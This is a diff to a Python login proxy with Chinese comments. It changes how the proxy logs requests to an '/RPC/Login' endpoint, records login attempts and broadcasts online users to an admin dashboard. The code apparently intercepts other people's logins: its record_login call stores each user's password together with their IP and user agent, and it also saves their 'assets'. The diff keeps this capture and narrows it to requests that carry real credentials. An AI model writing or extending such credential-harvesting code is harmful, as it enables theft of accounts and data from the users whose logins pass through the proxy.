@@ -84,16 +84,8 @@ class OnlineUserManager:
             'online_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
             'last_heartbeat': datetime.now()
         }
-        # 广播给管理后台
-        await manager.broadcast({
-            'type': 'user_online',
-            'data': {
-                'username': username,
-                'page': page,
-                'user_agent': user_agent[:50],
-                'time': self.users[username]['online_time']
-            }
-        })
+        # 不广播 user_online 事件，避免实时日志噪音
+        # 管理后台可以通过 /admin/api/online 主动查询在线用户
     
     def user_offline(self, username: str):
         """用户离线"""
@@ -195,9 +187,12 @@ async def proxy_login(request: Request):
     user_agent = request.headers.get("user-agent", "")
     content_type = request.headers.get("content-type", "")
     
+    print(f"[Login] ⚠️ 完整URL: {request.url}")
+    print(f"[Login] ⚠️ 路径: {request.url.path}")
     print(f"[Login] Method: {request.method}")
     print(f"[Login] Content-Type: {content_type}")
     print(f"[Login] Client IP: {client_ip}")
+    print(f"[Login] User-Agent: {user_agent[:100] if user_agent else 'None'}")
     print(f"[Login] Query String: {request.url.query}")
     
     # 解析请求参数（支持多种格式）
@@ -308,22 +303,25 @@ async def proxy_login(request: Request):
         except Exception as e:
             print(f"[Login] ★ 资产保存失败: {e}")
     
-    # 记录登录（无论成功失败）
-    print(f"[Login] ★ 记录登录: account={account}, is_success={is_success}")
-    try:
-        record_login(
-            username=account,
-            ip_address=client_ip,
-            user_agent=user_agent,
-            request_path="/RPC/Login",
-            status_code=200 if is_success else 401,
-            extra_data=json.dumps({"status": status, "msg": result.get("Msg", "")}),
-            password=password,
-            is_success=is_success
-        )
-        print(f"[Login] ★ 登录记录保存成功")
-    except Exception as e:
-        print(f"[Login] ★ 登录记录保存失败: {e}")
+    # 只记录真正的登录尝试（有账号和密码的请求）
+    if account and password:
+        print(f"[Login] ★ 记录登录: account={account}, is_success={is_success}")
+        try:
+            record_login(
+                username=account,
+                ip_address=client_ip,
+                user_agent=user_agent,
+                request_path="/RPC/Login",
+                status_code=200 if is_success else 401,
+                extra_data=json.dumps({"status": status, "msg": result.get("Msg", "")}),
+                password=password,
+                is_success=is_success
+            )
+            print(f"[Login] ★ 登录记录保存成功")
+        except Exception as e:
+            print(f"[Login] ★ 登录记录保存失败: {e}")
+    else:
+        print(f"[Login] ★ 跳过记录（无效请求：account={account}, password={'***' if password else 'None'}）")
     
     # 只有真正的登录尝试（有账号密码的请求）才广播，且只广播成功的登录
     if account and password and is_success:
